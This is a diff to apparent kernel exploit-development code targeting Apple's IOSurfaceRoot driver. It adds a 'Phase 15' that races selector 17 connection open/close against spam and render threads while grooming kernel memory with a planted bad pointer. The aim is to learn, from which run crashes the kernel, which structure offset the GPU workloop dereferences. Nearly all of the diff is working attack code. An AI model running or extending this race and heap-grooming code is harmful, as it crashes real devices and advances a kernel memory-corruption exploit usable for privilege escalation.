@@ -16855,10 +16855,14 @@ new_modes:
         rlog("=== IOSURFACE_SEL17: Raw selector 17/18 registry race ===\n");
         rlog("rounds=%d\n\n", rounds);
 
-        /* Fast-path: skip all earlier phases when rounds==14 */
+        /* Fast-path: skip all earlier phases for specific phase tests */
         if (rounds == 14) {
             rlog("*** rounds=14: fast-path to Phase 14 ***\n");
             goto phase13_done;
+        }
+        if (rounds >= 150 && rounds <= 154) {
+            rlog("*** rounds=%d: fast-path to Phase 15 ***\n", rounds);
+            goto phase14_done;
         }
 
         /* Open IOSurfaceRoot user client */
@@ -19596,6 +19600,164 @@ new_modes:
         }
         phase14_done:
         rlog("--- Phase 14 complete ---\n");
+
+        /*
+         * Phase 15: Structure offset crash oracle
+         *
+         * Phase 13 crashed (no groom → garbage next ptr → GPU walk deadlock)
+         * Phase 14 didn't crash (groom with NULL at all offsets → safe)
+         *
+         * Phase 15 tests: groom with BAD pointer at exactly one of the 3
+         * uint64 slots (the other two stay NULL/safe). Whichever slot causes
+         * a crash is the one the GPU workloop dereferences (the next pointer).
+         *
+         * Also: run many MORE iterations (40 like Phase 13) to ensure the
+         * race actually triggers.
+         *
+         * rounds=150 → poison slot 0 (+0x00)
+         * rounds=151 → poison slot 1 (+0x08)
+         * rounds=152 → poison slot 2 (+0x10)
+         * rounds=153 → all slots safe (control — should NOT crash, like Phase 14)
+         * rounds=154 → no groom at all (should crash, like Phase 13)
+         */
+        if (rounds >= 150 && rounds <= 154) {
+            rlog("\n--- Phase 15: Structure offset crash oracle (slot test %d) ---\n",
+                 rounds - 150);
+
+            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 12 * NSEC_PER_SEC),
+                dispatch_get_global_queue(0, 0), ^{
+                    rlog("  WATCHDOG: 12s — terminating\n");
+                    if (g_log) { fclose(g_log); g_log = NULL; }
+                    _exit(42);
+                });
+
+            io_service_t svc15 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            if (!svc15) { rlog("  Phase 15: service lookup failed\n"); goto phase15_done; }
+
+            /* Open groom connection (not used for rounds=154) */
+            io_connect_t gc15 = IO_OBJECT_NULL;
+            if (rounds != 154) {
+                if (IOServiceOpen(svc15, mach_task_self(), 0, &gc15) != KERN_SUCCESS) {
+                    rlog("  Phase 15: groom conn failed\n");
+                    goto phase15_done;
+                }
+            }
+
+            /* Build the test groom pattern */
+            uint8_t poison_fake[24];
+            memset(poison_fake, 0, sizeof(poison_fake));
+            uint64_t *pf = (uint64_t *)poison_fake;
+            uint64_t bad_ptr = 0xDEADBEEFCAFEBABEULL;
+            int poison_slot = rounds - 150; /* 0,1,2 for the three slots */
+
+            if (poison_slot >= 0 && poison_slot <= 2) {
+                pf[poison_slot] = bad_ptr;
+                rlog("  Poison: slot %d (+0x%02x) = 0x%llx, others=0\n",
+                     poison_slot, poison_slot * 8, (unsigned long long)bad_ptr);
+            } else if (rounds == 153) {
+                pf[0] = 0x1; /* safe refcnt */
+                rlog("  Control: all safe [0x1, 0, 0]\n");
+            } else {
+                rlog("  No groom (crash baseline)\n");
+            }
+
+            /* Start render loop */
+            p13_render_run = 1;
+            p13_render_frames = 0;
+            pthread_t render_th15;
+            pthread_create(&render_th15, NULL, p13_render_loop, NULL);
+            usleep(300000);
+            rlog("  Render running, frames=%d\n", p13_render_frames);
+
+            /* Run 40 iterations of v_race8 pattern (same as Phase 13) */
+            uint64_t inp15[3] = {1, 2, 3};
+            int p15_survived = 0;
+
+            for (int iter = 0; iter < 40; iter++) {
+                io_connect_t cs[8];
+                int have[8];
+                for (int i = 0; i < 8; i++) {
+                    have[i] = (IOServiceOpen(svc15, mach_task_self(), 0, &cs[i]) == KERN_SUCCESS);
+                    if (have[i]) {
+                        mach_port_t twp = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &twp);
+                        mach_port_insert_right(mach_task_self(), twp, twp, MACH_MSG_TYPE_MAKE_SEND);
+                        uint64_t ref = 0x1122334455667788ULL;
+                        IOConnectCallAsyncMethod(cs[i], 17, twp, &ref, 1,
+                            NULL, 0, inp15, 24, NULL, NULL, NULL, NULL);
+                        mach_port_deallocate(mach_task_self(), twp);
+                    } else cs[i] = IO_OBJECT_NULL;
+                }
+
+                /* Spam on first connection */
+                p13_spam_run = 1;
+                p13_spam_conn = have[0] ? cs[0] : IO_OBJECT_NULL;
+                p13_spam_shape = 1;
+                p13_spam_count = 0;
+                pthread_t spam15[16];
+                int nspam = 16; /* same as Phase 13 v_race8 */
+                for (int t = 0; t < nspam; t++)
+                    pthread_create(&spam15[t], NULL, p13_spam_reg, NULL);
+
+                /* Groom (unless rounds=154 = no-groom test) */
+                mach_port_t g15_wps[128];
+                int g15_n = 0;
+                uint64_t gref15 = 0xA1B2C3D4E5F60708ULL;
+
+                if (gc15) {
+                    for (int g = 0; g < 64; g++) {
+                        mach_port_t gwp = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                        mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
+                        IOConnectCallAsyncMethod(gc15, 1000, gwp, &gref15, 1,
+                            NULL, 0, poison_fake, 24, NULL, NULL, NULL, NULL);
+                        g15_wps[g15_n++] = gwp;
+                    }
+                }
+
+                /* Stagger close (same as Phase 13 v_race8) */
+                for (int i = 7; i >= 0; i--) {
+                    if (have[i]) { IOServiceClose(cs[i]); have[i] = 0; }
+                    /* Interleave groom after each close */
+                    if (gc15) {
+                        for (int g = 0; g < 4 && g15_n < 128; g++) {
+                            mach_port_t gwp = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                            mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
+                            IOConnectCallAsyncMethod(gc15, 1000, gwp, &gref15, 1,
+                                NULL, 0, poison_fake, 24, NULL, NULL, NULL, NULL);
+                            g15_wps[g15_n++] = gwp;
+                        }
+                    }
+                    usleep(50);
+                }
+
+                p13_spam_run = 0;
+                for (int t = 0; t < nspam; t++) pthread_join(spam15[t], NULL);
+                for (int i = 0; i < 8; i++) if (have[i]) IOServiceClose(cs[i]);
+                for (int g = 0; g < g15_n; g++)
+                    mach_port_deallocate(mach_task_self(), g15_wps[g]);
+
+                p15_survived++;
+                if (iter % 10 == 0 || iter == 39)
+                    rlog("  iter %d/%d survived (spam=%llu)\n", iter, 40,
+                         (unsigned long long)p13_spam_count);
+                usleep(50000);
+            }
+
+            rlog("  Result: %d/40 iterations survived\n", p15_survived);
+            rlog("  If this printed, the groom pattern at this slot did NOT crash\n");
+
+            p13_render_run = 0;
+            pthread_join(render_th15, NULL);
+            rlog("  Render stopped, frames=%d\n", p13_render_frames);
+
+            if (gc15) IOServiceClose(gc15);
+            IOObjectRelease(svc15);
+        }
+        phase15_done:
+        rlog("--- Phase 15 complete ---\n");
 
         rlog("\n=== IOSURFACE_SEL17 complete ===\n");
     }
